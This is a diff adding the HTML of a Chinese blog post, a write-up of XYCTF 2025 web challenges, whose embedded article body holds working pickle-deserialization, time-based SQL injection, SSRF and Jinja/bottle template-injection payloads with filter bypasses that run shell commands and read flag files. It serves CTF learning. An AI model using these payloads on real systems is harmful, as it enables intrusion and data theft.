@@ -1,0 +1,990 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>XYCTF-2025-Web-Writeup | Xrntkk&#39;s Blog</title>
+<meta name="keywords" content="writeup, ctf, Web">
+<meta name="description" content="Web
+Signin
+题目
+ 1# -*- encoding: utf-8 -*-
+ 2&#39;&#39;&#39;
+ 3@File    :   main.py
+ 4@Time    :   2025/03/28 22:20:49
+ 5@Author  :   LamentXU 
+ 6&#39;&#39;&#39;
+ 7&#39;&#39;&#39;
+ 8flag in /flag_{uuid4}
+ 9&#39;&#39;&#39;
+10from bottle import Bottle, request, response, redirect, static_file, run, route
+11with open(&#39;../../secret.txt&#39;, &#39;r&#39;) as f:
+12    secret = f.read()
+13
+14app = Bottle()
+15@route(&#39;/&#39;)
+16def index():
+17    return &#39;&#39;&#39;HI&#39;&#39;&#39;
+18@route(&#39;/download&#39;)
+19def download():
+20    name = request.query.filename
+21    if &#39;../../&#39; in name or name.startswith(&#39;/&#39;) or name.startswith(&#39;../&#39;) or &#39;\\&#39; in name:
+22        response.status = 403
+23        return &#39;Forbidden&#39;
+24    with open(name, &#39;rb&#39;) as f:
+25        data = f.read()
+26    return data
+27
+28@route(&#39;/secret&#39;)
+29def secret_page():
+30    try:
+31        session = request.get_cookie(&#34;name&#34;, secret=secret)
+32        if not session or session[&#34;name&#34;] == &#34;guest&#34;:
+33            session = {&#34;name&#34;: &#34;guest&#34;}
+34            response.set_cookie(&#34;name&#34;, session, secret=secret)
+35            return &#39;Forbidden!&#39;
+36        if session[&#34;name&#34;] == &#34;admin&#34;:
+37            return &#39;The secret has been deleted!&#39;
+38    except:
+39        return &#34;Error!&#34;
+40run(host=&#39;0.0.0.0&#39;, port=8080, debug=False)
+目录穿越拿secret">
+<meta name="author" content="Xrntkk">
+<link rel="canonical" href="http://localhost:1313/post/xyctf_2025/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.2b4603ab7eabc3642d3649f5b8728329d021f06eb40817493eab54c5172e9a52.css" integrity="sha256-K0YDq36rw2QtNkn1uHKDKdAh8G60CBdJPqtUxRcumlI=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/xyctf_2025/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="http://localhost:1313/post/xyctf_2025/">
+  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
+  <meta property="og:title" content="XYCTF-2025-Web-Writeup">
+  <meta property="og:description" content="Web Signin 题目
+1# -*- encoding: utf-8 -*- 2&#39;&#39;&#39; 3@File : main.py 4@Time : 2025/03/28 22:20:49 5@Author : LamentXU 6&#39;&#39;&#39; 7&#39;&#39;&#39; 8flag in /flag_{uuid4} 9&#39;&#39;&#39; 10from bottle import Bottle, request, response, redirect, static_file, run, route 11with open(&#39;../../secret.txt&#39;, &#39;r&#39;) as f: 12 secret = f.read() 13 14app = Bottle() 15@route(&#39;/&#39;) 16def index(): 17 return &#39;&#39;&#39;HI&#39;&#39;&#39; 18@route(&#39;/download&#39;) 19def download(): 20 name = request.query.filename 21 if &#39;../../&#39; in name or name.startswith(&#39;/&#39;) or name.startswith(&#39;../&#39;) or &#39;\\&#39; in name: 22 response.status = 403 23 return &#39;Forbidden&#39; 24 with open(name, &#39;rb&#39;) as f: 25 data = f.read() 26 return data 27 28@route(&#39;/secret&#39;) 29def secret_page(): 30 try: 31 session = request.get_cookie(&#34;name&#34;, secret=secret) 32 if not session or session[&#34;name&#34;] == &#34;guest&#34;: 33 session = {&#34;name&#34;: &#34;guest&#34;} 34 response.set_cookie(&#34;name&#34;, session, secret=secret) 35 return &#39;Forbidden!&#39; 36 if session[&#34;name&#34;] == &#34;admin&#34;: 37 return &#39;The secret has been deleted!&#39; 38 except: 39 return &#34;Error!&#34; 40run(host=&#39;0.0.0.0&#39;, port=8080, debug=False) 目录穿越拿secret">
+  <meta property="og:locale" content="zh">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2025-04-10T00:27:55+08:00">
+    <meta property="article:modified_time" content="2025-04-10T00:27:55+08:00">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Web">
+      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
+<meta name="twitter:title" content="XYCTF-2025-Web-Writeup">
+<meta name="twitter:description" content="Web
+Signin
+题目
+ 1# -*- encoding: utf-8 -*-
+ 2&#39;&#39;&#39;
+ 3@File    :   main.py
+ 4@Time    :   2025/03/28 22:20:49
+ 5@Author  :   LamentXU 
+ 6&#39;&#39;&#39;
+ 7&#39;&#39;&#39;
+ 8flag in /flag_{uuid4}
+ 9&#39;&#39;&#39;
+10from bottle import Bottle, request, response, redirect, static_file, run, route
+11with open(&#39;../../secret.txt&#39;, &#39;r&#39;) as f:
+12    secret = f.read()
+13
+14app = Bottle()
+15@route(&#39;/&#39;)
+16def index():
+17    return &#39;&#39;&#39;HI&#39;&#39;&#39;
+18@route(&#39;/download&#39;)
+19def download():
+20    name = request.query.filename
+21    if &#39;../../&#39; in name or name.startswith(&#39;/&#39;) or name.startswith(&#39;../&#39;) or &#39;\\&#39; in name:
+22        response.status = 403
+23        return &#39;Forbidden&#39;
+24    with open(name, &#39;rb&#39;) as f:
+25        data = f.read()
+26    return data
+27
+28@route(&#39;/secret&#39;)
+29def secret_page():
+30    try:
+31        session = request.get_cookie(&#34;name&#34;, secret=secret)
+32        if not session or session[&#34;name&#34;] == &#34;guest&#34;:
+33            session = {&#34;name&#34;: &#34;guest&#34;}
+34            response.set_cookie(&#34;name&#34;, session, secret=secret)
+35            return &#39;Forbidden!&#39;
+36        if session[&#34;name&#34;] == &#34;admin&#34;:
+37            return &#39;The secret has been deleted!&#39;
+38    except:
+39        return &#34;Error!&#34;
+40run(host=&#39;0.0.0.0&#39;, port=8080, debug=False)
+目录穿越拿secret">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/post/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "XYCTF-2025-Web-Writeup",
+      "item": "http://localhost:1313/post/xyctf_2025/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "XYCTF-2025-Web-Writeup",
+  "name": "XYCTF-2025-Web-Writeup",
+  "description": "Web Signin 题目\n1# -*- encoding: utf-8 -*- 2\u0026#39;\u0026#39;\u0026#39; 3@File : main.py 4@Time : 2025/03/28 22:20:49 5@Author : LamentXU 6\u0026#39;\u0026#39;\u0026#39; 7\u0026#39;\u0026#39;\u0026#39; 8flag in /flag_{uuid4} 9\u0026#39;\u0026#39;\u0026#39; 10from bottle import Bottle, request, response, redirect, static_file, run, route 11with open(\u0026#39;../../secret.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: 12 secret = f.read() 13 14app = Bottle() 15@route(\u0026#39;/\u0026#39;) 16def index(): 17 return \u0026#39;\u0026#39;\u0026#39;HI\u0026#39;\u0026#39;\u0026#39; 18@route(\u0026#39;/download\u0026#39;) 19def download(): 20 name = request.query.filename 21 if \u0026#39;../../\u0026#39; in name or name.startswith(\u0026#39;/\u0026#39;) or name.startswith(\u0026#39;../\u0026#39;) or \u0026#39;\\\\\u0026#39; in name: 22 response.status = 403 23 return \u0026#39;Forbidden\u0026#39; 24 with open(name, \u0026#39;rb\u0026#39;) as f: 25 data = f.read() 26 return data 27 28@route(\u0026#39;/secret\u0026#39;) 29def secret_page(): 30 try: 31 session = request.get_cookie(\u0026#34;name\u0026#34;, secret=secret) 32 if not session or session[\u0026#34;name\u0026#34;] == \u0026#34;guest\u0026#34;: 33 session = {\u0026#34;name\u0026#34;: \u0026#34;guest\u0026#34;} 34 response.set_cookie(\u0026#34;name\u0026#34;, session, secret=secret) 35 return \u0026#39;Forbidden!\u0026#39; 36 if session[\u0026#34;name\u0026#34;] == \u0026#34;admin\u0026#34;: 37 return \u0026#39;The secret has been deleted!\u0026#39; 38 except: 39 return \u0026#34;Error!\u0026#34; 40run(host=\u0026#39;0.0.0.0\u0026#39;, port=8080, debug=False) 目录穿越拿secret\n",
+  "keywords": [
+    "writeup", "ctf", "Web"
+  ],
+  "articleBody": "Web Signin 题目\n1# -*- encoding: utf-8 -*- 2''' 3@File : main.py 4@Time : 2025/03/28 22:20:49 5@Author : LamentXU 6''' 7''' 8flag in /flag_{uuid4} 9''' 10from bottle import Bottle, request, response, redirect, static_file, run, route 11with open('../../secret.txt', 'r') as f: 12 secret = f.read() 13 14app = Bottle() 15@route('/') 16def index(): 17 return '''HI''' 18@route('/download') 19def download(): 20 name = request.query.filename 21 if '../../' in name or name.startswith('/') or name.startswith('../') or '\\\\' in name: 22 response.status = 403 23 return 'Forbidden' 24 with open(name, 'rb') as f: 25 data = f.read() 26 return data 27 28@route('/secret') 29def secret_page(): 30 try: 31 session = request.get_cookie(\"name\", secret=secret) 32 if not session or session[\"name\"] == \"guest\": 33 session = {\"name\": \"guest\"} 34 response.set_cookie(\"name\", session, secret=secret) 35 return 'Forbidden!' 36 if session[\"name\"] == \"admin\": 37 return 'The secret has been deleted!' 38 except: 39 return \"Error!\" 40run(host='0.0.0.0', port=8080, debug=False) 目录穿越拿secret\n1./.././../secret.txt 1Hell0_H@cker_Y0u_A3r_Sm@r7 看到get_cookie打pickle反序列化(get_cookie中会进行pickle反序列化)\n1from bottle import cookie_encode 2import os 3 4secret = \"Hell0_H@cker_Y0u_A3r_Sm@r7\" 5 6class Name: 7 def __reduce__(self): 8 return (eval, (\"\"\"__import__('os').popen('calc').read()\"\"\",)) 9 10exp = cookie_encode(('session',{\"name\": [Name()]}),secret) 11print(exp) ‍\nezsql(手动滑稽) 这题大概fuzz一下可以发现username处waf很多\n1, 2- 3= 4| 5* 6\u0026 7空格 8order by 9like 10handler 11and 12union 在password处会对单双引号进行转义\n那我们只需要想办法构造闭合然后打时间盲注，由于会对单引号进行转义，我这里用的无列名注入\n1import requests 2 3url = \"xxxxx\" 4result = \"\" 5i = 0 6 7while True: 8 i = i + 1 9 head = 32 10 tail = 127 11 while head \u003c tail: 12 mid = (head + tail) \u003e\u003e 1 13 # 查表名 14 # payload = \"select group_concat(table_name) from information_schema.tables where table_schema=database()\" 15 # 无列名注入 16 # payload = \"select b from (select 1 as b,2 union select * from user limit 1,1)xrntkk\" 17 payload = \"select b from (select 1 as b union select * from double_check limit 1,1)xrntkk\" 18 19 20 data = { 21 'username': \"1'or\\t1=\", 22 'password': f'or if(ascii(substr(({payload}),{i},1))\u003e{mid},sleep(1),1)#' 23 } 24 try: 25 r = requests.post(url, data=data, timeout=1) 26 print(r.text) 27 tail = mid 28 except requests.exceptions.Timeout: 29 head = mid + 1 30 except Exception as e: 31 print(f\"An unexpected error occurred: {e}\") 32 break 33 34 if head != 32: 35 result += chr(head) 36 else: 37 break 38 print(\"[*]Result : \"+result) 可以拿到key\n1[*]Result : dtfrtkcc0czkoua9S 在doublecheck.php中输入拿到的key后，会跳转到index.php，可以进行命令执行但是无回显\n1cat%09/flag.txt\u003e/var/www/html/flag ‍\nFate 源码\n1#!/usr/bin/env python3 2import flask 3import sqlite3 4import requests 5import string 6import json 7app = flask.Flask(__name__) 8blacklist = string.ascii_letters 9def binary_to_string(binary_string): 10 if len(binary_string) % 8 != 0: 11 raise ValueError(\"Binary string length must be a multiple of 8\") 12 binary_chunks = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)] 13 string_output = ''.join(chr(int(chunk, 2)) for chunk in binary_chunks) 14 15 return string_output 16 17@app.route('/proxy', methods=['GET']) 18def nolettersproxy(): 19 url = flask.request.args.get('url') 20 if not url: 21 return flask.abort(400, 'No URL provided') 22 23 target_url = \"http://lamentxu.top\" + url 24 for i in blacklist: 25 if i in url: 26 return flask.abort(403, 'I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~') 27 if \".\" in url: 28 return flask.abort(403, 'No ssrf allowed') 29 response = requests.get(target_url) 30 31 return flask.Response(response.content, response.status_code) 32def db_search(code): 33 with sqlite3.connect('database.db') as conn: 34 cur = conn.cursor() 35 cur.execute(f\"SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER('{code}')))))))\") 36 found = cur.fetchone() 37 return None if found is None else found[0] 38 39@app.route('/') 40def index(): 41 print(flask.request.remote_addr) 42 return flask.render_template(\"index.html\") 43 44@app.route('/1337', methods=['GET']) 45def api_search(): 46 if flask.request.remote_addr == '127.0.0.1': 47 code = flask.request.args.get('0') 48 if code == 'abcdefghi': 49 print('0 win!') 50 req = flask.request.args.get('1') 51 try: 52 req = binary_to_string(req) 53 print(req) 54 req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;) 55 except: 56 flask.abort(400, \"Invalid JSON\") 57 if 'name' not in req: 58 flask.abort(400, \"Empty Person's name\") 59 60 name = req['name'] 61 if len(name) \u003e 6: 62 flask.abort(400, \"Too long\") 63 if '\\'' in name: 64 flask.abort(400, \"NO '\") 65 if ')' in name: 66 flask.abort(400, \"NO )\") 67 \"\"\" 68 Some waf hidden here ;) 69 \"\"\" 70 71 fate = db_search(name) 72 if fate is None: 73 flask.abort(404, \"No such Person\") 74 75 return {'Fate': fate} 76 else: 77 flask.abort(400, \"Hello local, and hello hacker\") 78 else: 79 flask.abort(403, \"Only local access allowed\") 80 81if __name__ == '__main__': 82 app.run(debug=True) 审计一下源码，看到init_db里面的fake flag，思路大概就是要在/proxy路由ssrf访问/1337路由去sql读flag\n先看proxy，会将传入的url拼接到http://lamentxu.top后面\n这里可用@来绕过\n接着有两个判断，url中不能存在字母和.\n这里用长整型绕过即可\n/proxy?url=@2130706433:8080/1337 接着我们看/1337\n1code = flask.request.args.get('0') 2if code == 'abcdefghi': 3 print('0 win!') 第一个判断要求传入一串字母，直接传显然过不了/proxy处的判断\n我们这里可以二次编码绕过\n接着往下看\n1req = flask.request.args.get('1') 2 try: 3 req = binary_to_string(req) 4 print(req) 5 req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;) 6 except: 7 flask.abort(400, \"Invalid JSON\") 8 if 'name' not in req: 9 flask.abort(400, \"Empty Person's name\") 10 11 name = req['name'] 12 if len(name) \u003e 6: 13 flask.abort(400, \"Too long\") 14 if '\\'' in name: 15 flask.abort(400, \"NO '\") 16 if ')' in name: 17 flask.abort(400, \"NO )\") 18 \"\"\" 19 Some waf hidden here ;) 20 \"\"\" 21 22 fate = db_search(name) 23 if fate is None: 24 flask.abort(404, \"No such Person\") 25 26 return {'Fate': fate} 这里会将传入的内容通过binary_to_string从二进制转换成字符串，接着会解析为json。接着有一连串waf。\n这里我们通过字典绕过，然后构造闭合读flag即可\nexp\n1import requests 2 3#字符串转二进制 4def string_to_binary(input_string): 5 binary_chunks = [bin(ord(char))[2:].zfill(8) for char in input_string] 6 return ''.join(binary_chunks) 7 8url = \"xxxxxxx\"+\"/proxy?url=%40%32%31%33%30%37%30%36%34%33%33%3a%38%30%38%30%2f%31%33%33%37%3f%30%3d%25%36%31%25%36%32%25%36%33%25%36%34%25%36%35%25%36%36%25%36%37%25%36%38%25%36%39%26%31%3d\" 9payload = string_to_binary(\"\"\"{\"name\": {\"'))))))) union select FATE from FATETABLE where NAME='LAMENTXU'--\":666}}\"\"\") 10# print(payload) 11req = requests.get(url+payload) 12data = req.json() 13print(data['Fate']) ‍\n‍\nNow you see me 1 从源代码中找出关键代码\n1# YOU FOUND ME :) 2# -*- encoding: utf-8 -*- 3''' 4@File : src.py 5@Time : 2025/03/29 01:10:37 6@Author : LamentXU 7''' 8import flask 9import sys 10 11enable_hook = False 12counter = 0 13 14def audit_checker(event, args): 15 global counter 16 if enable_hook: 17 if event in [\"exec\", \"compile\"]: 18 counter += 1 19 if counter \u003e 4: 20 raise RuntimeError(event) 21 22lock_within = [ 23 \"debug\", \"form\", \"args\", \"values\", 24 \"headers\", \"json\", \"stream\", \"environ\", 25 \"files\", \"method\", \"cookies\", \"application\", 26 'data', 'url' ,'\\'', '\"', 27 \"getattr\", \"_\", \"{{\", \"}}\", 28 \"[\", \"]\", \"\\\\\", \"/\",\"self\", 29 \"lipsum\", \"cycler\", \"joiner\", \"namespace\", 30 \"init\", \"dir\", \"join\", \"decode\", 31 \"batch\", \"first\", \"last\" , 32 \" \",\"dict\",\"list\",\"g.\", 33 \"os\", \"subprocess\", 34 \"g|a\", \"GLOBALS\", \"lower\", \"upper\", 35 \"BUILTINS\", \"select\", \"WHOAMI\", \"path\", 36 \"os\", \"popen\", \"cat\", \"nl\", \"app\", \"setattr\", \"translate\", 37 \"sort\", \"base64\", \"encode\", \"\\\\u\", \"pop\", \"referer\", 38 \"The closer you see, the lesser you find.\"] 39 40app = flask.Flask(__name__) 41 42@app.route('/') 43def index(): 44 return 'try /H3dden_route' 45 46@app.route('/H3dden_route') 47def r3al_ins1de_th0ught(): 48 global enable_hook, counter 49 name = flask.request.args.get('My_ins1de_w0r1d') 50 if name: 51 try: 52 if name.startswith(\"Follow-your-heart-\"): 53 for i in lock_within: 54 if i in name: 55 return 'NOPE.' 56 enable_hook = True 57 a = flask.render_template_string('{#{name}#}') 58 enable_hook = False 59 counter = 0 60 return a 61 else: 62 return 'My inside world is always hidden.' 63 except RuntimeError as e: 64 counter = 0 65 return 'NO.' 66 except Exception as e: 67 return 'Error' 68 else: 69 return 'Welcome to Hidden_route!' 70 71if __name__ == '__main__': 72 import os 73 try: 74 import _posixsubprocess 75 del _posixsubprocess.fork_exec 76 except: 77 pass 78 import subprocess 79 del os.popen 80 del os.system 81 del subprocess.Popen 82 del subprocess.call 83 del subprocess.run 84 del subprocess.check_output 85 del subprocess.getoutput 86 del subprocess.getstatusoutput 87 del subprocess.PIPE 88 del subprocess.STDOUT 89 del subprocess.CalledProcessError 90 del subprocess.TimeoutExpired 91 del subprocess.SubprocessError 92 sys.addaudithook(audit_checker) 93 app.run(debug=False, host='0.0.0.0', port=5000) 很明显的 SSTI，我们需要绕过一些过滤，看了一下发现 config 没有被过滤，所以我们可以用它来写入键值。\n通过content-type传参来进行绕过waf\nPayload：\n1{{lipsum.__globals__['__builtins__']['eval'](\"__import__('os').popen('whoami').read()\")}} 1GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(lip=a|attr(request.mimetype)))%}{%23 HTTP/1.1 2Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080 3Content-Type: lipsum 4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 5Connection: close 6 7GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(gl=a.lip|attr(request.mimetype)))%}{%23 HTTP/1.1 8Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080 9Content-Type: __globals__ 10Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 11Connection: close 12 13GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(get=request.mimetype))%}{%23 HTTP/1.1 14Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080 15Content-Type: __getitem__ 16Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 17Connection: close 18 19GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(bui=request.mimetype))%}{%23 HTTP/1.1 20Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080 21Content-Type: __builtins__ 22Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 23Connection: close 24 25GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(ev=request.mimetype))%}{%23 HTTP/1.1 26Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080 27Content-Type: eval 28Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 29Connection: close 30 31GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.glb|attr(a.get)(a.bui)|attr(a.get)(a.ev)(request.mimetype))%}{%23 HTTP/1.1 32Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080 33Content-Type: __import__('os').popen('mkdir static;cat /flag_h3r3 \u003e static/flag').read() 34Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 35Connection: close 访问/static/flag拿到flag\n‍\nNow you see me 2 这题跟上题打法一样，只是更换了传参的方式\n1GET /H3dden_route?spell=fly-%23}{%set%09a=config%}{%print(a.update(clss=a|attr(request.range.units)))%}{%23 HTTP/1.1 2Host: 127.0.0.1:5000 3Range: __class__=100-200 4Connection: close 拿到一张图片，用在线解密提取图片隐藏信息，无需密码\n1flag{__M@g1c1@ans_M@stering_M@g1c__} ‍\n出题人已疯 题目源码\n1# -*- encoding: utf-8 -*- 2''' 3@File : app.py 4@Time : 2025/03/29 15:52:17 5@Author : LamentXU 6''' 7import bottle 8''' 9flag in /flag 10''' 11@bottle.route('/') 12def index(): 13 return 'Hello, World!' 14@bottle.route('/attack') 15def attack(): 16 payload = bottle.request.query.get('payload') 17 if payload and len(payload) \u003c 25 and 'open' not in payload and '\\\\' not in payload: 18 return bottle.template('hello '+payload) 19 else: 20 bottle.abort(400, 'Invalid payload') 21if __name__ == '__main__': 22 bottle.run(host='0.0.0.0', port=5000) 用 import 加载模块，然后修改属性去实现变量持久化，从而去 RCE，然后可以用模板函数 include 去读文件\n1%0a%import+os;os.a='__imp' 2%0a%import+os;os.b='ort__' 3%0a%import+os;os.a%2B=os.b 4%0a%import+os;os.b='(\"os\"' 5%0a%import+os;os.a%2B=os.b 6%0a%import+os;os.b=').sys' 7%0a%import+os;os.a%2B=os.b 8%0a%import+os;os.b='tem(\"' 9%0a%import+os;os.a%2B=os.b 10%0a%import+os;os.b='ca' 11%0a%import+os;os.a%2B=os.b 12%0a%import+os;os.b='t+/f*' 13%0a%import+os;os.a%2B=os.b 14%0a%import+os;os.b='\u003e1\")' 15%0a%import+os;os.a%2B=os.b 16%0a%import+os;exec(os.a) 17 18%0a%import os;eval(os.a) 19%0a%include('1') ‍\nez_puzzle 非预期 查看puzzle.js，看到有一大段base64\ncyberchef转换一下\n发现是zlib\n看到一串hex\n反转一下转字符串就能拿到flag\n预期解 这题打开控制台会触发反调试\n右键从忽略列表中移除即可\n在代码中可以找到startTime和endTime，猜测应该是endTime-startTime来判断时间，所以直接在控制台给startTime赋一个大值\nstartTime=66666666666666 然后把拼图拼好即可拿到flag\n出题人又疯(复现) 聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass - LamentXU - 博客园\n这题主要是由于bottle框架中对编码检查的不严谨，所以可以利用python中会将exec执行的代码中的斜体字转换为对应的ASCII字符的特性来绕过waf。但是由于url编码问题，题目环境中只有o和a能够成功。\n详细的得看lamentxu师傅的博客。\n所以这题我们就可以把\n'o'替换为'%ba', 'a'替换为'%aa', payload\n{{open('/flag').read()}} 替换 {\\{%bapen('/flag').read()}} //这里的\"\\\"是防止hugo报错加的，实际不需要 ",
+  "wordCount" : "2555",
+  "inLanguage": "zh",
+  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-04-10T00:27:55+08:00",
+  "dateModified": "2025-04-10T00:27:55+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "Xrntkk"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/post/xyctf_2025/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Xrntkk's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/" title="Categories">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      XYCTF-2025-Web-Writeup
+    </h1>
+    <div class="post-meta"><span title='2025-04-10 00:27:55 +0800 CST'>2025-04-10</span>&nbsp;·&nbsp;6 分钟&nbsp;·&nbsp;Xrntkk
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">目录</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#web" aria-label="Web">Web</a><ul>
+                        
+                <li>
+                    <a href="#signin" aria-label="Signin">Signin</a></li>
+                <li>
+                    <a href="#ezsql%e6%89%8b%e5%8a%a8%e6%bb%91%e7%a8%bd" aria-label="ezsql(手动滑稽)">ezsql(手动滑稽)</a></li>
+                <li>
+                    <a href="#fate" aria-label="Fate">Fate</a></li>
+                <li>
+                    <a href="#now-you-see-me-1" aria-label="Now you see me 1">Now you see me 1</a></li>
+                <li>
+                    <a href="#now-you-see-me-2" aria-label="Now you see me 2">Now you see me 2</a></li>
+                <li>
+                    <a href="#%e5%87%ba%e9%a2%98%e4%ba%ba%e5%b7%b2%e7%96%af" aria-label="出题人已疯">出题人已疯</a></li>
+                <li>
+                    <a href="#ez_" aria-label="ez_puzzle">ez_puzzle</a><ul>
+                        
+                <li>
+                    <a href="#%e9%9d%9e%e9%a2%84%e6%9c%9f" aria-label="非预期">非预期</a></li>
+                <li>
+                    <a href="#%e9%a2%84%e6%9c%9f%e8%a7%a3" aria-label="预期解">预期解</a></li></ul>
+                </li>
+                <li>
